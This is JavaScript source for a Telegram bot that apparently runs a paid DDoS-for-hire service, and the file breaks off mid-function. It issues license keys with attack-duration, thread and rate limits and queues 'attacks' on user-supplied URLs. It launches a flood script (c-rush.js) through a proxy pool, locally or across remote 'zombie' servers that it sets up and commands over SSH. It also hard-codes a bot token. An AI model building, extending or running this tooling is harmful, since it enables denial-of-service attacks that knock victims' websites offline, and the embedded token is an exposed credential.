'use strict';

const fs   = require('fs');
const os   = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');
const { Client: SSHClient } = require('ssh2');

const Bot = typeof TelegramBot === 'function'
    ? TelegramBot
    : (TelegramBot && (TelegramBot.default || TelegramBot.TelegramBot)) || null;
if (typeof Bot !== 'function') {
    throw new Error('node-telegram-bot-api did not export a constructor.');
}

// =============================================================
//  CONFIG
// =============================================================
const CONFIG = {
    OWNER_ID:   8872751291,
    BOT_TOKEN:  '9030160105:AAFRI9E76I6QRx9n14y6VCgm7jgrzhqA94Q',
    SCRIPT_PATH: 'c-rush.js',

    MAX_ATTACK_DURATION:     86400,
    HARD_MAX_THREADS:        100,
    HARD_MAX_RATE:           100000,

    DEFAULT_MAX_ATTACK_DURATION: 120,
    DEFAULT_MAX_THREADS:         20,
    DEFAULT_MAX_RATE:            64,

    // 🆕 فقط یک اتک در کل سیستم فعال — بقیه صف
    MAX_CONCURRENT_ATTACKS:  1,
    MAX_TOTAL_THREADS:       200,
    MAX_QUEUE_SIZE:          200,
    MIN_FREE_MEM_MB:         256,

    // 🆕 فاصله بین اتک‌ها در صف (۱۰ ثانیه)
    QUEUE_GAP_MS:            10000,

    REFERRAL_TARGET: 3,

    ZOMBIE_CHECK_INTERVAL: 120000,
    ZOMBIE_WORKDIR: '/root/c-rush',

    DATA_DIR: path.join(__dirname, 'data'),
    TMP_DIR:  path.join(__dirname, 'data', 'tmp'),
};

const REFERRAL_REWARD = {
    durationDays:      1,
    maxUses:           1,
    dailyLimit:        20,
    cooldownSeconds:   50,
    maxConcurrent:     1,
    maxAttackDuration: 120,
    maxThreads:        50,
    maxRate:            64,
    maxZombies:        0,
};

const ZOMBIE_NPM_DEPS = 'colors node-bash-title hpack axios';

// =============================================================
//  ENV CHECK
// =============================================================
(function checkDeps() {
    const required = ['colors', 'node-bash-title', 'hpack', 'axios', 'ssh2'];
    const missing = [];
    for (const dep of required) {
        try { require.resolve(dep); } catch { missing.push(dep); }
    }
    if (missing.length) {
        console.error('\n⚠️  Missing dependencies:');
        for (const m of missing) console.error('   • ' + m);
        console.error('\n   Fix: npm i ' + missing.join(' ') + '\n');
        process.exit(1);
    }
    if (!fs.existsSync(path.join(__dirname, CONFIG.SCRIPT_PATH))) {
        console.error(`\n⚠️  ${CONFIG.SCRIPT_PATH} not found.\n`);
        process.exit(1);
    }
})();

// =============================================================
//  STORAGE
// =============================================================
if (!fs.existsSync(CONFIG.DATA_DIR)) fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });
if (!fs.existsSync(CONFIG.TMP_DIR))  fs.mkdirSync(CONFIG.TMP_DIR,  { recursive: true });

const FILES = {
    users:    path.join(CONFIG.DATA_DIR, 'users.json'),
    licenses: path.join(CONFIG.DATA_DIR, 'licenses.json'),
    admins:   path.join(CONFIG.DATA_DIR, 'admins.json'),
    stats:    path.join(CONFIG.DATA_DIR, 'stats.json'),
    proxies:  path.join(CONFIG.DATA_DIR, 'proxies.txt'),
    channels: path.join(CONFIG.DATA_DIR, 'required_channels.json'),
    referrals:path.join(CONFIG.DATA_DIR, 'referrals.json'),
    zombies:  path.join(CONFIG.DATA_DIR, 'zombies.json'),
    blacklist:path.join(CONFIG.DATA_DIR, 'blacklist.json'),
};

const loadJSON = (f, d) => { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return d; } };
const saveJSON = (f, d) => { try { fs.writeFileSync(f, JSON.stringify(d, null, 2)); } catch (e) { console.error(e); } };

let users     = loadJSON(FILES.users, {});
let licenses  = loadJSON(FILES.licenses, {});
let admins    = loadJSON(FILES.admins, []);
let stats     = loadJSON(FILES.stats, { totalAttacks: 0, totalUsers: 0, totalLicenses: 0 });
let referrals = loadJSON(FILES.referrals, {});
let zombies   = loadJSON(FILES.zombies, []);
let blacklist = loadJSON(FILES.blacklist, []);

(function migrateProxies() {
    const legacyPlural   = path.join(__dirname, 'proxies.txt');
    const legacySingular = path.join(CONFIG.DATA_DIR, 'proxy.txt');
    const target         = FILES.proxies;
    if (fs.existsSync(target)) return;
    if (fs.existsSync(legacyPlural))   { try { fs.copyFileSync(legacyPlural,   target); return; } catch {} }
    if (fs.existsSync(legacySingular)) { try { fs.copyFileSync(legacySingular, target); return; } catch {} }
    fs.writeFileSync(target, '');
})();

// =============================================================
//  LICENSE HELPERS
// =============================================================
function licMaxAttackDuration(lic) {
    const v = lic?.maxAttackDuration;
    return Number.isFinite(v) && v > 0 ? Math.min(v, CONFIG.MAX_ATTACK_DURATION) : CONFIG.DEFAULT_MAX_ATTACK_DURATION;
}
function licMaxThreads(lic) {
    const v = lic?.maxThreads;
    return Number.isFinite(v) && v > 0 ? Math.min(v, CONFIG.HARD_MAX_THREADS) : CONFIG.DEFAULT_MAX_THREADS;
}
function licMaxRate(lic) {
    const v = lic?.maxRate;
    return Number.isFinite(v) && v > 0 ? Math.min(v, CONFIG.HARD_MAX_RATE) : CONFIG.DEFAULT_MAX_RATE;
}
function licMaxZombies(lic) {
    const v = lic?.maxZombies;
    if (v === -1) return -1;
    return Number.isFinite(v) && v > 0 ? v : 0;
}

// =============================================================
//  BLACKLIST
// =============================================================
function isBlacklisted(target) {
    let host;
    try {
        host = new URL(target).hostname.toLowerCase();
        if (!host) return null;
    } catch { return null; }

    for (const raw of blacklist) {
        const pat = String(raw).toLowerCase().trim();
        if (!pat) continue;
        if (pat.startsWith('*.')) {
            if (host === pat.slice(2) || host.endsWith(pat.slice(1))) return raw;
        } else if (pat.startsWith('.')) {
            if (host === pat.slice(1) || host.endsWith(pat)) return raw;
        } else if (host === pat || host.endsWith('.' + pat)) {
            return raw;
        }
    }
    return null;
}

// =============================================================
//  RUNTIME STATE
// =============================================================
const userState      = new Map();
const activeAttacks  = new Map();
const attackQueue    = [];
let   attackCounter  = 0;
let   totalActiveThreads = 0;

// 🆕 قفل صف — بعد از تموم شدن هر اتک، ۱۰ ثانیه قفل
let   queueLockedUntil = 0;
let   queueDrainTimer  = null;
let   lastFinishedAttackId = null;

const memberCache    = new Map();
const warnedChannels = new Set();
const MEMBER_CACHE_TTL = 2 * 60 * 1000;

let BOT_USERNAME = '';
let botUsernamePromise = null;
function getBotUsername() {
    if (BOT_USERNAME) return Promise.resolve(BOT_USERNAME);
    if (!botUsernamePromise) {
        botUsernamePromise = bot.getMe().then(me => {
            BOT_USERNAME = me.username;
            return BOT_USERNAME;
        }).catch(() => '');
    }
    return botUsernamePromise;
}

// =============================================================
//  HELPERS
// =============================================================
const now = () => Date.now();
const DAY = 86400000;
const isOwner = id => Number(id) === CONFIG.OWNER_ID;
const isAdmin = id => isOwner(id) || admins.includes(Number(id));
const esc = s => String(s).replace(/[_*`\[\]()~>#+\-=|{}.!]/g, m => '\\' + m);

function getUser(id) {
    const k = String(id);
    if (!users[k]) {
        users[k] = {
            id: Number(id), username: '', firstName: '',
            joinedAt: now(), licenseKey: null, activatedAt: null, expiresAt: null,
            banned: false, totalAttacks: 0,
            daily: { date: '', count: 0 }, lastAttackAt: 0,
        };
    }
    const u = users[k];
    if (!u.daily) u.daily = { date: '', count: 0 };
    if (typeof u.lastAttackAt !== 'number') u.lastAttackAt = 0;
    return u;
}

function getReferral(id) {
    const k = String(id);
    if (!referrals[k]) referrals[k] = { invitedBy: null, count: 0, rewardedAt: null, rewardKey: null };
    return referrals[k];
}

function todayStr() {
    const d = new Date();
    return `${d.getUTCFullYear()}-${String(d.getUTCMonth()+1).padStart(2,'0')}-${String(d.getUTCDate()).padStart(2,'0')}`;
}

function resetDailyIfNeeded(u) {
    const t = todayStr();
    if (u.daily.date !== t) { u.daily.date = t; u.daily.count = 0; }
}

function getLicenseForUser(userId) {
    const u = users[String(userId)];
    if (!u || !u.licenseKey) return null;
    return licenses[u.licenseKey] || null;
}

function isLicensed(id) {
    const u = users[String(id)];
    if (!u || u.banned) return false;
    return u.expiresAt && u.expiresAt > now();
}

function fmtDate(ts) {
    if (!ts) return '—';
    return new Date(ts).toISOString().replace('T', ' ').slice(0, 16) + ' UTC';
}

function genLicenseKey() {
    const seg = () => Math.random().toString(36).substring(2, 6).toUpperCase().padEnd(4, 'X');
    return `RUSH-${seg()}-${seg()}-${seg()}-${seg()}`;
}

function freeMemMB() { return Math.round(os.freemem() / 1048576); }

const PROXY_RE = /^[A-Za-z0-9_.\-]+:\d{1,5}$/;
function parseProxyLines(raw) {
    return String(raw).split(/\r?\n/).map(l => l.trim())
        .filter(l => l.length > 0 && !l.startsWith('#'))
        .map(l => l.replace(/^(?:https?|socks[45]?):\/\//i, ''))
        .filter(l => PROXY_RE.test(l));
}

// =============================================================
//  FORCE-JOIN
// =============================================================
function clearMemberCacheFor(userId) {
    for (const key of [...memberCache.keys()]) {
        if (key.endsWith(`:${userId}`)) memberCache.delete(key);
    }
}

async function checkMembership(userId) {
    const channels = loadJSON(FILES.channels, []);
    if (!channels.length) return { ok: true, missing: [] };

    clearMemberCacheFor(userId);

    const missing = [];
    for (const ch of channels) {
        try {
            const m = await bot.getChatMember(ch.id, userId);
            const ok = ['member', 'administrator', 'creator'].includes(m.status);
            if (!ok) missing.push(ch);
        } catch (e) {
            const msg = String(e.message || '');
            if (/user not found|chat not found|participant/i.test(msg)) {
                if (!warnedChannels.has(ch.id)) {
                    console.warn(`[force-join] Skip ${ch.id}: ${msg}`);
                    warnedChannels.add(ch.id);
                }
                continue;
            }
            if (!warnedChannels.has(ch.id)) {
                console.warn(`[force-join] Cannot verify ${ch.id}: ${msg}`);
                warnedChannels.add(ch.id);
            }
        }
    }
    return { ok: missing.length === 0, missing };
}

function buildJoinKeyboard(missing) {
    const kb = { inline_keyboard: [] };
    for (const ch of missing) {
        const link = ch.username ? `https://t.me/${ch.username}` : (ch.inviteLink || null);
        if (link) kb.inline_keyboard.push([{ text: `📢 ${ch.title || ch.id}`, url: link }]);
    }
    kb.inline_keyboard.push([{ text: '✅ I Joined — Verify', callback_data: 'fj_verify' }]);
    return kb;
}

async function sendJoinPrompt(chatId, missing) {
    await bot.sendMessage(chatId,
        `🔒 *Join Required*\n\n` +
        `To use this bot, please join:\n` +
        missing.map(c => `• ${esc(c.title || String(c.id))}`).join('\n') +
        `\n\nAfter joining, tap *I Joined — Verify*.`,
        { parse_mode: 'Markdown', reply_markup: buildJoinKeyboard(missing) }
    ).catch(() => {});
}

// =============================================================
//  REFERRAL
// =============================================================
function grantReferralReward(userId) {
    const ref = getReferral(userId);
    if (ref.rewardedAt) return null;

    const key = genLicenseKey();
    licenses[key] = {
        key,
        durationDays:      REFERRAL_REWARD.durationDays,
        maxUses:           REFERRAL_REWARD.maxUses,
        dailyLimit:        REFERRAL_REWARD.dailyLimit,
        cooldownSeconds:   REFERRAL_REWARD.cooldownSeconds,
        maxConcurrent:     REFERRAL_REWARD.maxConcurrent,
        maxAttackDuration: REFERRAL_REWARD.maxAttackDuration,
        maxThreads:        REFERRAL_REWARD.maxThreads,
        maxRate:           REFERRAL_REWARD.maxRate,
        maxZombies:        REFERRAL_REWARD.maxZombies,
        usedCount:         1,
        usedBy:            [{ userId, at: now() }],
        createdAt:         now(),
        expiresAt:         now() + 365 * DAY,
        createdBy:         'referral-system',
        isReferralReward:  true,
    };
    saveJSON(FILES.licenses, licenses);
    stats.totalLicenses = (stats.totalLicenses || 0) + 1;
    saveJSON(FILES.stats, stats);

    const u = getUser(userId);
    const startFrom = Math.max(now(), u.expiresAt || 0);
    u.licenseKey   = key;
    u.activatedAt  = now();
    u.expiresAt    = startFrom + REFERRAL_REWARD.durationDays * DAY;
    u.daily        = { date: todayStr(), count: 0 };
    u.lastAttackAt = 0;
    saveJSON(FILES.users, users);

    ref.rewardedAt = now();
    ref.rewardKey  = key;
    saveJSON(FILES.referrals, referrals);
    return key;
}

// =============================================================
//  SSH / ZOMBIE HELPERS
// =============================================================
function sshConnect(z, timeout = 15000) {
    return new Promise((resolve, reject) => {
        const conn = new SSHClient();
        const timer = setTimeout(() => { try { conn.end(); } catch {} reject(new Error('SSH connect timeout')); }, timeout);
        conn.on('ready', () => { clearTimeout(timer); resolve(conn); });
        conn.on('error', e => { clearTimeout(timer); reject(e); });
        conn.connect({
            host: z.host,
            port: z.port || 22,
            username: z.username,
            password: z.password,
            readyTimeout: timeout,
            keepaliveInterval: 10000,
            keepaliveCountMax: 3,
        });
    });
}

function sftpPutFile(conn, localPath, remotePath) {
    return new Promise((resolve, reject) => {
        conn.sftp((err, sftp) => {
            if (err) return reject(err);
            sftp.fastPut(localPath, remotePath, (e) => e ? reject(e) : resolve());
        });
    });
}

function sftpPutString(conn, content, remotePath) {
    return new Promise((resolve, reject) => {
        conn.sftp((err, sftp) => {
            if (err) return reject(err);
            const stream = sftp.createWriteStream(remotePath);
            stream.on('error', reject);
            stream.on('close', () => resolve());
            stream.end(content);
        });
    });
}

function sshExec(conn, cmd) {
    return new Promise((resolve) => {
        conn.exec(cmd, (err, stream) => {
            if (err) return resolve({ code: -1, stdout: '', stderr: err.message });
            let stdout = '', stderr = '';
            stream.on('data', d => { stdout += d.toString(); });
            stream.stderr.on('data', d => { stderr += d.toString(); });
            stream.on('close', code => resolve({ code, stdout, stderr }));
        });
    });
}

function sshSpawn(conn, cmd) {
    return new Promise((resolve, reject) => {
        conn.exec(cmd, (err, stream) => {
            if (err) return reject(err);
            resolve(stream);
        });
    });
}

async function setupZombieDeps(conn, onProgress) {
    onProgress?.('🔍 Checking Node.js...');
    let r = await sshExec(conn, 'command -v node >/dev/null 2>&1 && node -v || echo NO_NODE');
    let nodeVersion = r.stdout.trim();

    if (nodeVersion === 'NO_NODE' || !nodeVersion.startsWith('v')) {
        onProgress?.('📦 Installing Node.js (may take 1-2 min)...');
        r = await sshExec(conn,
            'apt-get update -y >/dev/null 2>&1 && ' +
            'apt-get install -y curl >/dev/null 2>&1 && ' +
            'curl -fsSL https://deb.nodesource.com/setup_20.x | bash - >/dev/null 2>&1 && ' +
            'apt-get install -y nodejs >/dev/null 2>&1 && node -v'
        );
        nodeVersion = r.stdout.trim().split('\n').pop();
        if (!nodeVersion || !nodeVersion.startsWith('v')) {
            onProgress?.('📦 Trying yum (RHEL/CentOS)...');
            r = await sshExec(conn,
                'yum install -y curl >/dev/null 2>&1 && ' +
                'curl -fsSL https://rpm.nodesource.com/setup_20.x | bash - >/dev/null 2>&1 && ' +
                'yum install -y nodejs >/dev/null 2>&1 && node -v'
            );
            nodeVersion = r.stdout.trim().split('\n').pop();
        }
        if (!nodeVersion || !nodeVersion.startsWith('v')) {
            throw new Error('Failed to install Node.js: ' + (r.stderr || 'unknown').slice(0, 200));
        }
    }

    onProgress?.(`✅ Node.js ${nodeVersion}\n📁 Preparing workdir...`);
    await sshExec(conn, `mkdir -p ${CONFIG.ZOMBIE_WORKDIR}`);

    onProgress?.('📤 Uploading c-rush.js...');
    await sftpPutFile(conn, path.join(__dirname, CONFIG.SCRIPT_PATH), `${CONFIG.ZOMBIE_WORKDIR}/c-rush.js`);

    onProgress?.('📦 Installing npm deps...');
    r = await sshExec(conn,
        `cd ${CONFIG.ZOMBIE_WORKDIR} && npm init -y >/dev/null 2>&1 && ` +
        `npm install ${ZOMBIE_NPM_DEPS} --silent 2>&1 | tail -3`
    );
    if (r.code !== 0) {
        throw new Error('npm install failed: ' + (r.stderr || r.stdout).slice(0, 200));
    }

    onProgress?.('🧪 Testing setup...');
    r = await sshExec(conn,
        `cd ${CONFIG.ZOMBIE_WORKDIR} && node -e "` +
        `require('colors');require('hpack');require('axios');require('node-bash-title');` +
        `console.log('READY')"`
    );
    if (!r.stdout.includes('READY')) {
        throw new Error('Dependency test failed: ' + (r.stderr || 'unknown').slice(0, 200));
    }

    return nodeVersion;
}

function activeZombies() {
    return zombies.filter(z => z.status === 'online');
}

// =============================================================
//  PROXY POOL
// =============================================================
function mergeProxies(newLines, mode) {
    let existing = [];
    try {
        existing = fs.readFileSync(FILES.proxies, 'utf8')
            .split('\n').map(l => l.trim()).filter(Boolean);
    } catch {}

    let finalList = mode === 'replace'
        ? [...new Set(newLines)]
        : [...new Set([...existing, ...newLines])];

    fs.writeFileSync(FILES.proxies, finalList.join('\n'));

    const added = finalList.length - existing.length;
    const dupes = mode === 'add'
        ? (existing.length + newLines.length - finalList.length)
        : (newLines.length - finalList.length);

    return {
        submitted: newLines.length,
        added: Math.max(0, added),
        dupes: Math.max(0, dupes),
        total: finalList.length,
        mode,
    };
}

// =============================================================
//  PERMISSION
// =============================================================
function checkUserPermission(userId) {
    const u = getUser(userId);
    const lic = getLicenseForUser(userId);

    if (!u.expiresAt || u.expiresAt <= now())
        return { ok: false, reason: 'Your license has expired. Contact admin.' };

    resetDailyIfNeeded(u);
    const dailyLimit = lic?.dailyLimit ?? 5;
    if (u.daily.count >= dailyLimit)
        return { ok: false, reason: `Daily attack limit reached (${u.daily.count}/${dailyLimit}).` };

    const cooldownMs = (lic?.cooldownSeconds ?? 60) * 1000;
    const remain = u.lastAttackAt + cooldownMs - now();
    if (remain > 0)
        return { ok: false, reason: `Cooldown: wait ${Math.ceil(remain/1000)}s.` };

    const concurrent = [...activeAttacks.values()].filter(a => a.userId === userId).length;
    const maxConc = lic?.maxConcurrent ?? 1;
    if (concurrent >= maxConc)
        return { ok: false, reason: `Concurrent limit reached (${concurrent}/${maxConc}).` };

    return { ok: true, license: lic, user: u };
}

function canAcquireSlot() {
    if (activeAttacks.size >= CONFIG.MAX_CONCURRENT_ATTACKS) return false;
    if (freeMemMB() < CONFIG.MIN_FREE_MEM_MB) return false;
    return true;
}

// =============================================================
//  🆕 SERIAL QUEUE — فقط یک اتک فعال در کل سیستم
// =============================================================
function enqueueAttack(entry) {
    if (attackQueue.length >= CONFIG.MAX_QUEUE_SIZE) return { ok: false, reason: 'Queue full.' };
    entry.queuedAt = now();
    entry.queueId  = attackQueue.length + 1;
    attackQueue.push(entry);
    return { ok: true, position: attackQueue.length };
}

function removeFromQueueByUser(userId) {
    for (let i = attackQueue.length - 1; i >= 0; i--) {
        if (attackQueue[i].userId === userId) attackQueue.splice(i, 1);
    }
}

function lockQueueFor(ms) {
    queueLockedUntil = Math.max(queueLockedUntil, now() + ms);
}

function scheduleDrain(delayMs) {
    if (queueDrainTimer) return;
    queueDrainTimer = setTimeout(() => {
        queueDrainTimer = null;
        drainQueue();
    }, delayMs);
}

/**
 * 🆕 فقط یک اتک در هر بار drain می‌شه — بعدش قفل می‌شه تا اون اتک تموم بشه
 * و بعد ۱۰ ثانیه gap
 */
function drainQueue() {
    if (attackQueue.length === 0) return;

    // هنوز در حال قفل هستیم (gap ۱۰ ثانیه)
    const lockRemain = queueLockedUntil - now();
    if (lockRemain > 0) {
        scheduleDrain(lockRemain + 50);
        return;
    }

    // اگه اتک فعالی هست، صبر کن تا تموم بشه
    if (!canAcquireSlot()) {
        scheduleDrain(2000);
        return;
    }

    const head = attackQueue[0];
    const perm = checkUserPermission(head.userId);
    if (!perm.ok) {
        attackQueue.shift();
        try { head.reply(`❌ Queued attack dropped: ${perm.reason}`); } catch {}
        scheduleDrain(50);
        return;
    }

    attackQueue.shift();

    // 🆕 شروع اتک + قفل ۱۰ ثانیه‌ای فقط بعد از تموم شدن اعمال می‌شه (توی finishHandler)
    spawnAttackNow(head, true /* fromQueue */);
}

/**
 * 🆕 وقتی هر اتکی (محلی یا zombie) تموم شد، این صدا زده می‌شه
 * - قفل ۱۰ ثانیه‌ای اعمال می‌کنه
 * - drain بعدی رو زمان‌بندی می‌کنه
 */
function onAttackFinished(attackId) {
    lastFinishedAttackId = attackId;
    lockQueueFor(CONFIG.QUEUE_GAP_MS);
    if (attackQueue.length > 0) {
        scheduleDrain(CONFIG.QUEUE_GAP_MS + 100);
    }
}

// =============================================================
//  LOCAL SPAWN
// =============================================================
function spawnAttackNow(entry, fromQueue = false) {
    const { chatId, userId, target, duration, threads, rate, options, reply } = entry;

    const scriptPath = path.join(__dirname, CONFIG.SCRIPT_PATH);
    const proxyPath  = FILES.proxies;

    if (!fs.existsSync(scriptPath)) { try { reply('❌ c-rush.js missing.'); } catch {} return null; }
    if (!fs.existsSync(proxyPath) || fs.statSync(proxyPath).size < 5) { try { reply('❌ Proxy pool empty.'); } catch {} return null; }

    const args = [
        CONFIG.SCRIPT_PATH, target, String(duration), proxyPath,
        String(threads), String(rate),
    ];
    if (options.cookies)  args.push('-c');
    if (options.headfull) args.push('-h');
    if (options.silent)   args.push('-s');
    if (options.version)  args.push('-v', String(options.version));
    args.push('-ch', options.cache ? 'true' : 'false');

    const proc = spawn('node', args, {
        cwd: __dirname,
        stdio: ['ignore', 'pipe', 'pipe'],
        env: { ...process.env, FORCE_COLOR: '0' },
    });

    const attackId = ++attackCounter;
    const endTime  = now() + duration * 1000;
    totalActiveThreads += threads;

    let stderrBuf = '', stdoutBuf = '';
    proc.stderr.on('data', d => { stderrBuf += d.toString(); if (stderrBuf.length > 16000) stderrBuf = stderrBuf.slice(-16000); });
    proc.stdout.on('data', d => { stdoutBuf += d.toString(); if (stdoutBuf.length > 16000) stdoutBuf = stdoutBuf.slice(-16000); });

    const killTimer = setTimeout(() => {
        if (activeAttacks.has(attackId)) { try { proc.kill('SIGKILL'); } catch {} }
    }, (duration + 15) * 1000);

    activeAttacks.set(attackId, {
        id: attackId, chatId, userId, target, duration, threads, rate, options,
        proc, endTime, startedAt: now(), killTimer, type: 'local', fromQueue,
    });

    const u = getUser(userId);
    resetDailyIfNeeded(u);
    u.daily.count += 1;
    u.lastAttackAt = now();
    u.totalAttacks = (u.totalAttacks || 0) + 1;
    saveJSON(FILES.users, users);

    stats.totalAttacks = (stats.totalAttacks || 0) + 1;
    saveJSON(FILES.stats, stats);

    proc.on('exit', code => {
        clearTimeout(killTimer);
        activeAttacks.delete(attackId);
        totalActiveThreads -= threads;
        if (totalActiveThreads < 0) totalActiveThreads = 0;

        let errorTail = '';
        if (code !== 0) {
            const src = (stderrBuf.trim() || stdoutBuf.trim());
            if (src) errorTail = `\n\n📋 Last error:\n\`\`\`\n${src.split('\n').slice(-12).join('\n')}\n\`\`\``;
        }

        const nextIn = attackQueue.length > 0 ? `\n⏭ Next queued attack starts in ${CONFIG.QUEUE_GAP_MS/1000}s` : '';

        bot.sendMessage(chatId,
            `✅ *Attack #${attackId} finished*\n🎯 \`${target}\`\n⏱ ${duration}s — exit ${code}${nextIn}${errorTail}`,
            { parse_mode: 'Markdown' }
        ).catch(() => {});

        // 🆕 قفل ۱۰ ثانیه + drain بعدی
        onAttackFinished(attackId);
    });

    proc.on('error', err => {
        totalActiveThreads -= threads;
        if (totalActiveThreads < 0) totalActiveThreads = 0;
        bot.sendMessage(chatId, `❌ Launch error: ${esc(err.message)}`).catch(() => {});
        onAttackFinished(attackId);
    });

    const lic = getLicenseForUser(userId);
    const flagsOn = [];
    if (options.cookies)  flagsOn.push('cookies');
    if (options.headfull) flagsOn.push('headfull');
    if (options.silent)   flagsOn.push('silent');
    if (options.cache)    flagsOn.push('cache');

    reply(
        `🚀 *Attack #${attackId} started*${fromQueue ? ' (📤 from queue)' : ''} (💻 local)\n\n` +
        `🎯 \`${target}\`\n` +
        `⏱ ${duration}s / ${licMaxAttackDuration(lic)}s cap\n` +
        `🧵 ${threads}t / ${licMaxThreads(lic)}t cap\n` +
        `⚡ ${rate}/t / ${licMaxRate(lic)} cap\n` +
        `🔧 ${flagsOn.join(', ') || '—'} | HTTP v${options.version || '2'}\n\n` +
        `📊 Daily: ${u.daily.count}/${lic?.dailyLimit ?? 5}\n` +
        `🏊 Active: ${activeAttacks.size}/${CONFIG.MAX_CONCURRENT_ATTACKS} | Queue: ${attackQueue.length}`
    );
    return attackId;
}

// =============================================================
//  ZOMBIE SPAWN
// =============================================================
async function spawnOnZombies(entry, zombieList) {
    const { chatId, userId, target, duration, threads, rate, options, reply } = entry;

    const proxiesContent = fs.readFileSync(FILES.proxies, 'utf8');
    if (proxiesContent.trim().length < 5) return reply('❌ Proxy pool empty.');

    const attackId = ++attackCounter;
    const perZombieThreads = Math.max(1, Math.floor(threads / zombieList.length));
    const perZombieRate = Math.min(rate, CONFIG.HARD_MAX_RATE);

    const children = [];
    const failures = [];

    for (const z of zombieList) {
        try {
            const conn = await sshConnect(z, 15000);
            await sftpPutFile(conn, path.join(__dirname, CONFIG.SCRIPT_PATH), `${CONFIG.ZOMBIE_WORKDIR}/c-rush.js`);
            await sftpPutString(conn, proxiesContent, `${CONFIG.ZOMBIE_WORKDIR}/proxies.txt`);

            const argv = [
                target, String(duration), 'proxies.txt',
                String(perZombieThreads), String(perZombieRate),
            ];
            if (options.cookies)  argv.push('-c');
            if (options.headfull) argv.push('-h');
            if (options.silent)   argv.push('-s');
            if (options.version)  argv.push('-v', String(options.version));
            argv.push('-ch', options.cache ? 'true' : 'false');

            const cmd = `cd ${CONFIG.ZOMBIE_WORKDIR} && node c-rush.js ${argv.map(a => `'${String(a).replace(/'/g, "'\\''")}'`).join(' ')}`;
            const stream = await sshSpawn(conn, cmd);

            const child = { type: 'zombie', zombieId: z.id, host: z.host, conn, stream, exitCode: null };
            children.push(child);

            let errTail = '';
            stream.stderr.on('data', d => { errTail += d.toString(); if (errTail.length > 4000) errTail = errTail.slice(-4000); });
            stream.on('close', code => {
                child.exitCode = code;
                child.errTail = errTail;
                try { conn.end(); } catch {}
                checkAttackDone(attackId);
            });
            stream.on('error', () => {
                child.exitCode = -1;
                child.errTail = errTail;
                try { conn.end(); } catch {}
                checkAttackDone(attackId);
            });
        } catch (e) {
            failures.push(`${z.host}:${z.port} — ${e.message.slice(0, 120)}`);
            z.status = 'offline';
            z.lastCheck = now();
        }
    }
    saveJSON(FILES.zombies, zombies);

    if (!children.length) {
        return reply(
            `❌ *All zombies failed*\n\n` +
            failures.slice(0, 3).map(f => `• ${esc(f)}`).join('\n')
        );
    }

    activeAttacks.set(attackId, {
        id: attackId, chatId, userId, target, duration, threads, rate, options,
        children, finishedCount: 0,
        endTime: now() + duration * 1000,
        startedAt: now(), type: 'zombie',
    });

    const u = getUser(userId);
    resetDailyIfNeeded(u);
    u.daily.count += 1;
    u.lastAttackAt = now();
    u.totalAttacks = (u.totalAttacks || 0) + 1;
    saveJSON(FILES.users, users);
    stats.totalAttacks = (stats.totalAttacks || 0) + 1;
    saveJSON(FILES.stats, stats);

    setTimeout(() => {
        const a = activeAttacks.get(attackId);
        if (!a) return;
        for (const c of a.children) {
            try { c.stream.signal('KILL'); } catch {}
            try { c.conn.end(); } catch {}
        }
    }, (duration + 15) * 1000);

    const lic = getLicenseForUser(userId);
    reply(
        `🚀 *Attack #${attackId} started* (🧟 ${children.length} zombie${children.length>1?'s':''})\n\n` +
        `🎯 \`${target}\`\n` +
        `⏱ ${duration}s / ${licMaxAttackDuration(lic)}s cap\n` +
        `🧵 ${perZombieThreads}t × ${children.length} = *${perZombieThreads * children.length}t*\n` +
        `⚡ ${perZombieRate}/t\n` +
        `🧟 Nodes: ${children.map(c => c.host).join(', ')}\n` +
        (failures.length ? `\n⚠️ Failed: ${failures.length}\n` : '') +
        `\n📊 Daily: ${u.daily.count}/${lic?.dailyLimit ?? 5}`
    );
}

function checkAttackDone(attackId) {
    const a = activeAttacks.get(attackId);
    if (!a || a.type !== 'zombie') return;
    a.finishedCount = (a.finishedCount || 0) + 1;
    if (a.finishedCount < a.children.length) return;

    activeAttacks.delete(attackId);
    const summary = a.children.map(c => {
        const code = c.exitCode ?? '?';
        return `• ${c.host}: ${code === 0 ? '✅' : '⚠️ exit ' + code}`;
    }).join('\n');
    const nextIn = attackQueue.length > 0 ? `\n⏭ Next queued attack starts in ${CONFIG.QUEUE_GAP_MS/1000}s` : '';
    bot.sendMessage(a.chatId,
        `✅ *Attack #${attackId} finished* — ${a.finishedCount}/${a.children.length} nodes\n${summary}${nextIn}`,
        { parse_mode: 'Markdown' }
    ).catch(() => {});

    // 🆕 قفل ۱۰ ثانیه + drain بعدی
    onAttackFinished(attackId);
}

// =============================================================
//  UNIFIED DISPATCH
// =============================================================
function dispatchAttack(chatId, userId, target, duration, threads, rate, options, reply) {
    const perm = checkUserPermission(userId);
    if (!perm.ok) return reply(`❌ ${perm.reason}`);

    const blocked = isBlacklisted(target);
    if (blocked) return reply(`⛔ *Target blocked* — matches blacklist: \`${esc(blocked)}\``);

    const lic = perm.license;
    duration = Math.min(duration, licMaxAttackDuration(lic));
    threads  = Math.min(threads,  licMaxThreads(lic));
    rate     = Math.min(rate,     licMaxRate(lic));

    const entry = { chatId, userId, target, duration, threads, rate, options, reply };

    const maxZ = licMaxZombies(lic);
    let zombiesToUse = 0;
    if (maxZ === -1) zombiesToUse = activeZombies().length;
    else if (maxZ > 0) zombiesToUse = Math.min(maxZ, activeZombies().length);

    // 🆕 چک قفل صف یا اتک فعال
    const queueLockRemain = queueLockedUntil - now();
    const activeCount = activeAttacks.size;
    const needsQueue = (activeCount >= CONFIG.MAX_CONCURRENT_ATTACKS) || (queueLockRemain > 0) || (attackQueue.length > 0);

    if (needsQueue) {
        const q = enqueueAttack(entry);
        if (!q.ok) return reply(`❌ ${q.reason}`);

        // محاسبه ETA تقریبی
        let etaSec = Math.max(0, Math.ceil(queueLockRemain / 1000));
        if (activeCount > 0) {
            const active = [...activeAttacks.values()][0];
            const activeRemain = Math.max(0, Math.ceil((active.endTime - now()) / 1000));
            etaSec = activeRemain + Math.ceil(CONFIG.QUEUE_GAP_MS / 1000);
        }
        // هر اتک در صف قبل از این + ۱۰ ثانیه gap
        const posAhead = q.position - 1;
        etaSec += posAhead * (duration + Math.ceil(CONFIG.QUEUE_GAP_MS / 1000));

        const activeInfo = activeCount > 0
